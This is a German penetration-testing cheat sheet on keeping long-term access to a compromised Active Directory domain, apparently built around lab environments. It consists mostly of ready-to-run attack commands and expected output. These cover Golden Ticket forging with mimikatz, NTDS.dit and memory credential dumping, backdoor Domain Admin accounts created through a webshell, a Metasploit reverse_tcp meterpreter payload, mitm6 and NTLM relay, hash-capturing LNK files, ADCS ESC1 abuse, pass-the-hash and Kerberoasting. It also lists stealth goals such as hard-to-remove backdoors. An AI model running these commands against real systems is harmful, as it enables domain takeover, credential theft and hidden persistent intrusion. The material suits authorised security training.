# Persistence

# Ziel der Persistence Phase

- Dauerhaften Zugriff zum kompromittierten System/Netzwerk sichern
- Überleben von Neustarts, Passwort-Änderungen und Credential-Rotationen
- Mehrere unabhängige Zugriffsmethoden etablieren
- Schwer zu entfernende Backdoors implementieren
- Wiedereintritt auch nach Teilweise-Remediation ermöglichen

---

## Golden Ticket Persistence

### Voraussetzungen

- Domain Admin Zugriff erforderlich
- krbtgt-Hash aus NTDS.dit
- Domain SID

### NTDS.dit Dumping für Golden Ticket


```bash
# Komplette NTDS.dit extrahieren
impacket-secretsdump MARVEL.local/hawkeye:'Password1@'@192.168.xx.x

# Nur NTLM Hashes
impacket-secretsdump MARVEL.local/hawkeye:'Password1@'@192.168.xx.x -just-dc-ntlm
```

**Extrahiert:**

- krbtgt-Account Hash
- Alle Domain User Hashes
- Domain SID

### Golden Ticket Erstellung (Windows/Mimikatz)

cmd

```cmd
# Mimikatz starten
mimikatz.exe

# Debug Privilegien prüfen
privilege::debug
```

**Erwartete Ausgabe:** `Privilege '20' OK`

mimikatz

```mimikatz
# Kerberos Ticket Informationen extrahieren
lsadump::lsa /inject /name:krbtgt
```

**Wichtig kopieren:**

- Domain SID (z.B. `S-1-5-21-...`)
- NTLM Hash des krbtgt Accounts

mimikatz

```mimikatz
# Golden Ticket erstellen (Generisches Template)
kerberos::golden /User:Administrator /domain:marvel.local /sid:S-1-5-21-... /krbtgt:HASH_HIER /id:500 /ptt

# Golden Ticket mit fiktivem User
kerberos::golden /User:Batman /domain:marvel.local /sid:S-1-5-21-1234567890-1111111111-2222222222 /krbtgt:8A1B2C3D4E... /id:500 /ptt

# CMD mit Golden Ticket öffnen
misc::cmd
```

### Golden Ticket Parameter

|Parameter|Bedeutung|Beispiel|
|---|---|---|
|`/User:`|Benutzername (kann fiktiv sein)|`Administrator` oder `Batman`|
|`/domain:`|FQDN der Ziel-Domain|`marvel.local`|
|`/sid:`|Security Identifier der Domain|`S-1-5-21-...`|
|`/krbtgt:`|NTLM-Hash des krbtgt-Accounts|Hash aus `lsadump::lsa`|
|`/id:`|RID des Benutzers|`500` (Administrator)|
|`/ptt`|Pass The Ticket - Ticket sofort injizieren|-|

### Golden Ticket Eigenschaften

- **Extrem mächtig** - kann auf 10 Jahre Gültigkeit konfiguriert werden
- Funktioniert **nur mit krbtgt-Hash**
- **Schwer zu erkennen** - kein realer Logon findet statt
- RID 500 = immer Administrator
- Ticket funktioniert auch mit nicht-existierenden Benutzernamen
- **Einzige Gegenmaßnahme:** krbtgt-Hash-Rotation

---

## Domain User Persistence

### Neuen Domain Admin erstellen


```bash
# Via Webshell
curl "http://10.10.255.70/dev/back.php?c=net%20user%20harry%20haxxor@12345%20/add%20/domain"
curl "http://10.10.255.70/dev/back.php?c=net%20localgroup%20Administrators%20harry%20/add%20/domain"
```

cmd

```cmd
# Via Command Shell (Windows)
net user /add hawkeye Password1@ /domain
net group "Domain Admins" hawkeye /ADD /DOMAIN

# Alternative für deutschsprachige Systeme
net group "Domänen-Admins" hawkeye /ADD /DOMAIN
```

### Via Evil-WinRM

cmd

```cmd
# In Evil-WinRM Session
net user /add backdoor Complex!Pass123 /domain
net group "Domain Admins" backdoor /add /domain
```

### Via Token Impersonation (Metasploit)


```bash
# In Meterpreter Session mit impersonated Admin Token
shell
net user /add hawkeye Password1@ /domain
net group "Domain Admins" hawkeye /ADD /DOMAIN
```

### Verification


```bash
# Zugriff mit neuem Account testen
impacket-secretsdump MARVEL.local/hawkeye:'Password1@'@192.168.xx.x
evil-winrm -u hawkeye -p 'Password1@' -i 192.168.xx.x
```

---

## Token Impersonation Persistence

### Initial Setup (Metasploit)


```bash
msfconsole
use exploit/windows/smb/psexec
set payload windows/x64/meterpreter/reverse_tcp
set RHOSTS 192.168.xx.x
set SMBUser mmustermann
set SMBPass Password1
set SMBDomain MARVEL.local
set LHOST [YOUR_KALI_IP]
set LPORT [YOUR_PORT]
run
```

### Token Impersonation Setup


```bash
# In Meterpreter Session
load incognito
list_tokens -u
```

**Erwartete Tokens:**

- `MARVEL\mmustermann` (Domain User)
- `NT-AUTHORITY\SYSTEM` (Local System)
- Verschiedene Service Accounts

### Administrator Token nutzen


```bash
# Nach Admin Login auf Target System
list_tokens -u
impersonate_token marvel\\\\administrator

shell
whoami   # Should show MARVEL\Administrator
```

### Domain Compromise via Token

cmd

```cmd
# In impersonated Administrator Shell
net user /add hawkeye Password1@ /domain
net group "Domain Admins" hawkeye /ADD /DOMAIN
```

### Token Reversion


```bash
# Zurück zu Original Identity
rev2self
getuid   # Should show NT-AUTHORITY\SYSTEM
```

---

## IPv6 DNS Takeover Persistence (mitm6)

### Basic mitm6 Attack


```bash
# Terminal 1: mitm6 starten
sudo mitm6 -d marvel.local

# Terminal 2: LDAPS relay zu Domain Controller
impacket-ntlmrelayx -6 -t ldaps://192.168.xx.x -wh fakewpad.marvel.local -l lootme
```

**Parameter:**

- **-6** = IPv6 Support für mitm6 Integration
- **-t ldaps://192.168.57.14** = Target Domain Controller via LDAPS
- **-wh fakewpad.marvel.local** = Fake WPAD Hostname
- **-l lootme** = Output Directory für AD Data

### Alternative SMB Relay mit mitm6


````bash
# Terminal 1: mitm6 (gleich wie oben)
sudo mitm6 -d marvel.local

# Terminal 2: SMB relay zu Workstations
ntlmrelayx.py -tf targets.txt -smb2support -6
```

### Persistence Features

**Automatic Recompromise:**
- Attack persistiert durch System Reboots
- Frische IPv6 Konfiguration triggert neue Authentication
- Computer Accounts authentifizieren automatisch zu DC
- Kontinuierliche WPAD Requests erhalten Persistence

### Expected Results bei Administrator Compromise
```
[*] HTTPD(80): Authenticating against ldaps://192.168.xx.x as MARVEL/ADMINISTRATOR SUCCEED
[*] User privileges found: Create user
[*] User privileges found: Adding user to a privileged group
[*] Adding new user with username: hSnKXmKTJa and password: C:hEI7O(MO}Y}F/
[*] Success! User hSnKXmKTJa now has Replication-Get-Changes-All privileges on the domain
````

---

## LNK File Persistence

### Responder Configuration für LNK


```bash
# SMB in Responder aktivieren
sudo nano /usr/share/responder/Responder.conf
# Change: SMB = On
```

### Responder starten


```bash
sudo responder -I eth0 -dwv
```

### Shell Access etablieren


```bash
impacket-smbexec MARVEL.local/hawkeye:'Password1@'@192.168.xx.x
```

### PowerShell LNK Creation

powershell

```powershell
powershell

$objShell = New-Object -ComObject WScript.shell
$lnk = $objShell.CreateShortcut("C:\important_document.lnk")
$lnk.TargetPath = "\\192.168.57.5@test.png"
$lnk.WindowStyle = 1
$lnk.IconLocation = "%windir%\system32\shell32.dll, 3"
$lnk.Description = "Important Document"
$lnk.Save()
```

### Trigger Hash Capture

cmd

````cmd
# LNK File ausführen
C:\important_document.lnk
```

**Expected Responder Output:**
```
[SMB] NTLMv2-SSP Client   : 192.168.xx.x
[SMB] NTLMv2-SSP Username : MARVEL\hawkeye
[SMB] NTLMv2-SSP Hash     : hawkeye::MARVEL:1122334455667788:...
````

### Cleanup Configuration


```bash
# Responder config wiederherstellen
sudo nano /usr/share/responder/Responder.conf
# Change: SMB = Off
```

---

## Mimikatz Memory Credential Persistence

### Vorbereitung


```bash
# Zu Mimikatz Directory navigieren
cd /usr/share/windows-resources/mimikatz/x64/
```

### File Transfer via SMB


```bash
# Einzelne Uploads
smbclient //192.168.xx.x/C$ -U MARVEL.local/jdoe -c "put mimikatz.exe Windows\\Temp\\mimikatz.exe"
smbclient //192.168.xx.x/C$ -U MARVEL.local/jdoe -c "put mimidrv.sys Windows\\Temp\\mimidrv.sys"
smbclient //192.168.xx.x/C$ -U MARVEL.local/jdoe -c "put mimilib.dll Windows\\Temp\\mimilib.dll"
smbclient //192.168.xx.x/C$ -U MARVEL.local/jdoe -c "put mimispool.dll Windows\\Temp\\mimispool.dll"
```

### Shell Access


```bash
impacket-smbexec MARVEL.local/jdoe:Password1@192.168.xx.x
```

### File Transfer Verification

cmd

```cmd
dir C:\Windows\Temp\mimi*.*
```

### Mimikatz Execution

cmd

```cmd
# Interactive Mimikatz
C:\Windows\Temp\mimikatz.exe
```

**In Mimikatz Prompt:**

mimikatz

```mimikatz
privilege::debug
sekurlsa::logonpasswords
```

### Direct Execution Alternative

cmd

```cmd
C:\Windows\Temp\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"
```

**Memory Credential Extraction Results:**

- Domain User Hashes (wenn eingeloggt)
- Machine Account Credentials
- Kerberos Tickets und AES Keys
- DPAPI Master Keys

---

## Child-to-Parent Domain Escalation Persistence

### Credential Extraction mit lsassy


```bash
lsassy -u harry -p 'haxxor@12345' -d lab.trusted.vl 10.10.255.70
```

### Domain SID Reconnaissance


```bash
# Child Domain SID ermitteln
lookupsid.py lab.trusted.vl/harry:'haxxor@12345'@10.10.255.70

# Trust-Beziehungen und Parent Domain SID
ldeep ldap -u harry -p 'haxxor@12345' -d lab.trusted.vl -s ldap://10.10.255.70 trusts
```

### DNS Setup (Critical!)


```bash
echo "10.10.255.70 lab.trusted.vl labdc.lab.trusted.vl" | sudo tee -a /etc/hosts
echo "10.10.255.69 trusted.vl trusteddc.trusted.vl" | sudo tee -a /etc/hosts
```

### Automated Child-to-Parent Escalation


```bash
raiseChild.py lab.trusted.vl/cpowers -hashes :322db798a55f85f09b3d61b976a13c43
```

### Parent Domain Compromise


```bash
# Komplette NTDS.DIT der Parent Domain dumpen
secretsdump.py -hashes :15db914be1e6a896e7692f608a9d72ef trusted.vl/Administrator@10.10.255.69

# Zugriff auf Parent DC
evil-winrm -i 10.10.255.69 -u Administrator -H 15db914be1e6a896e7692f608a9d72ef
```

---

## ADCS ESC1 Persistence

### BloodHound Enumeration


```bash
bloodhound-python -u 'peter.turner' -p 'b0cwR+G4Dzl_rw' -d hybrid.vl -dc dc01.hybrid.vl -ns 10.10.175.181 -c all
```

### Vulnerable Template Discovery


```bash
certipy-ad find -u peter.turner@hybrid.vl -p 'b0cwR+G4Dzl_rw' -dc-ip 10.10.175.181 -vulnerable
# Template: HybridComputers (ESC1)
```

### Keytab zu Hash Conversion


```bash
python3 keytabextract.py krb5.keytab
# NTLM: 0f916c5246fdbc7ba95dcef4126d57bd
```

### Certificate Request


```bash
certipy-ad req -u 'MAIL01$' -hashes :0f916c5246fdbc7ba95dcef4126d57bd -ca hybrid-DC01-CA -target 10.10.175.181 -template HybridComputers -upn administrator@hybrid.vl -key-size 4096
```

### PassTheCert


```bash
python3 passthecert.py -action modify_user -crt admin.crt -key admin.key -domain hybrid.vl -dc-ip 10.10.175.181 -target administrator -new-pass Password123!
```

### Domain Admin Access


```bash
evil-winrm -i 10.10.175.181 -u administrator -p 'Password123!'
```

---

## SMB Relay Persistence

### SMB Signing Detection


```bash
# Scan für SMB Signing Konfiguration
sudo nmap --script=smb2-security-mode.nse -p 445 192.168.xx.x/24 -Pn
```

**Key Results:**

- **"enabled but not required"** = Vulnerable to NTLM Relay
- **"enabled and required"** = Protected

### Target List erstellen


```bash
nano targets.txt
# Vulnerable IPs hinzufügen:
192.168.xx.x
192.168.xx.x
```

### Responder für Relay konfigurieren


```bash
sudo mousepad /etc/responder/Responder.conf
# Set:
SMB = Off
HTTP = Off
```

### Responder starten (Modified)


```bash
sudo responder -I eth0 -dwv
```

### NTLM Relay Setup - Interactive Mode


```bash
# Interactive Shell nach Relay
impacket-ntlmrelayx -tf targets.txt -smb2support -i
```

**Parameter:**

- **-tf targets.txt** = Target File mit Victim IPs
- **-smb2support** = SMB2/SMB3 Protocol Support
- **-i** = Interactive Mode

### Access Interactive Shell


```bash
# Connect zu Interactive Session
nc 127.0.0.1 11000

# Alternative
telnet 127.0.0.1 11000
```

**Interactive Commands:**

smb

```smb
help
use C$
ls
```

---

## Hash-basierte Persistence

### Pass-the-Hash Access


```bash
# PSExec mit Hash
impacket-psexec -hashes aad3b435b51404eeaad3b435b51404ee:7facdc498ed1680c4fd1448319a8c04f Administrator@192.168.xx.x

# WMIExec mit Hash
impacket-wmiexec -hashes aad3b435b51404eeaad3b435b51404ee:7facdc498ed1680c4fd1448319a8c04f Administrator@192.168.xx.x

# SMBExec mit Hash
impacket-smbexec -hashes aad3b435b51404eeaad3b435b51404ee:7facdc498ed1680c4fd1448319a8c04f Administrator@192.168.xx.x

# Evil-WinRM mit Hash
evil-winrm -i 10.10.255.69 -u Administrator -H 15db914be1e6a896e7692f608a9d72ef
```

### CrackMapExec Pass-the-Hash


```bash
# Netzwerk-weit PTH
crackmapexec smb 192.168.xx.x/24 -u administrator -H aad3b435b51404eeaad3b435b51404ee:7facdc498ed1680c4fd1448319a8c04f --local-auth
```

**Result Indicators:**

- `[+]` = Erfolgreiche Authentication
- `Pwn3d!` = Administrative Privilegien
- `[-]` = Authentication fehlgeschlagen

---

## Kerberoasting Service Account Persistence

### SPN Enumeration und Ticket Request


```bash
impacket-GetUserSPNs MARVEL.local/mmustermann:Password1 -dc-ip 192.168.xx.x -request
```

**Prozess:**

1. Queries AD für Service Principal Names
2. Requests TGS Tickets für jeden SPN
3. Extrahiert encrypted Hashes für Offline Cracking

### Kerberoast Hash Processing


```bash
# Hash speichern
echo '$krb5tgs$23$*SQLService$MARVEL.LOCAL$MARVEL.local/SQLService*$54e...' > kerb_hashes.txt

# Mit Hashcat cracken
hashcat -m 13100 kerb_hashes.txt /usr/share/wordlists/rockyou.txt
```

**Beispiel Result:**

- **Service:** SQLService (SQL Server Account)
- **Password:** Mypassword123#
- **Privileges:** Oft Domain Admin Level

---

## Persistence Workflow

### Phase 1: Initial Backdoor


```bash
# 1. Domain Admin erstellen
net user /add backdoor Complex!Pass123 /domain
net group "Domain Admins" backdoor /add /domain

# 2. Verify Access
impacket-secretsdump MARVEL.local/backdoor:'Complex!Pass123'@192.168.xx.x
```

### Phase 2: Golden Ticket Creation


```bash
# 1. NTDS.dit dumpen
impacket-secretsdump MARVEL.local/backdoor:'Complex!Pass123'@192.168.xx.x

# 2. krbtgt Hash und Domain SID notieren

# 3. Golden Ticket auf Windows System erstellen
# (siehe Golden Ticket Section oben)
```

### Phase 3: Alternative Backdoors


```bash
# 1. LNK File platzieren
# (siehe LNK File Persistence Section)

# 2. mitm6 Setup für Auto-Recompromise
sudo mitm6 -d marvel.local &
impacket-ntlmrelayx -6 -t ldaps://192.168.xx.x -wh fakewpad.marvel.local -l lootme

# 3. Multiple Access Methods testen
evil-winrm -u backdoor -p 'Complex!Pass123' -i 192.168.xx.x
impacket-psexec MARVEL.local/backdoor:'Complex!Pass123'@192.168.xx.x
```

### Phase 4: Credential Collection


```bash
# 1. Alle Domain Hashes sichern
impacket-secretsdump MARVEL.local/backdoor:'Complex!Pass123'@192.168.xx.x > domain_hashes.txt

# 2. Service Account Passwords extrahieren
impacket-GetUserSPNs MARVEL.local/backdoor:Complex!Pass123 -dc-ip 192.168.xx.x -request

# 3. Wichtige Hashes offline cracken
hashcat -m 1000 ntlm_hashes.txt /usr/share/wordlists/rockyou.txt
```

---

## Troubleshooting

### Golden Ticket Issues


```bash
# Wenn Golden Ticket fehlschlägt:
# 1. Domain SID korrekt?
# 2. krbtgt Hash korrekt extrahiert?
# 3. Domain FQDN exakt?
# 4. RID korrekt gesetzt?
```

### Domain User Creation Issues

cmd

```cmd
# Wenn User Creation fehlschlägt:
# 1. Domain Admin Rechte vorhanden?
# 2. Password Policy erfüllt?
# 3. Korrekte Domain angegeben?
# 4. Sprachspezifische Group Namen?

# Group Namen testen
net group /domain
net localgroup
```

### mitm6 Persistence Issues


```bash
# Wenn IPv6 Attack fehlschlägt:
# 1. IPv6 auf Target Systems enabled?
# 2. Network erlaubt IPv6 Router Advertisements?
# 3. mitm6 mit korrektem Domain Name?
# 4. LDAPS (Port 636) auf DC erreichbar?

# LDAPS Connectivity testen
openssl s_client -connect 192.168.57.14:636
```

---

## Success Indicators

### Persistence Success

- ✅ Multiple unabhängige Backdoor-Accounts erstellt
- ✅ Golden Ticket funktioniert über Reboots
- ✅ Hash-basierter Access auf multiple Systeme
- ✅ Automatische Recompromise via mitm6
- ✅ Service Account Credentials gesichert

### Long-term Access

- ✅ NTDS.dit Backup gesichert
- ✅ krbtgt Hash dokumentiert
- ✅ Multiple Domain Admin Accounts
- ✅ Pass-the-Hash funktioniert netzwerkweit
- ✅ LNK Files für Credential Harvesting platziert

### Stealth Indicators

- ✅ Backdoor-Accounts unauffällig benannt
- ✅ Golden Tickets ohne echte Logins
- ✅ Token Impersonation hinterlässt wenig Logs
- ✅ mitm6 Attack schwer zu detecten
- ✅ Pass-the-Hash vermeidet Password-based Authentication

---

## Cleanup

### Backdoor User entfernen

cmd

```cmd
# Domain User löschen
net user backdoor /delete /domain
net user hawkeye /delete /domain
```

### LNK Files entfernen

cmd

```cmd
# Malicious LNK Files löschen
del C:\important_document.lnk
```

### mitm6 beenden


```bash
# mitm6 Prozesse killen
sudo pkill mitm6

# ntlmrelayx beenden
pkill -f ntlmrelayx
```

### Responder Configuration zurücksetzen


```bash
# Responder Config wiederherstellen
sudo nano /etc/responder/Responder.conf
# Set:
SMB = Off
HTTP = Off
```
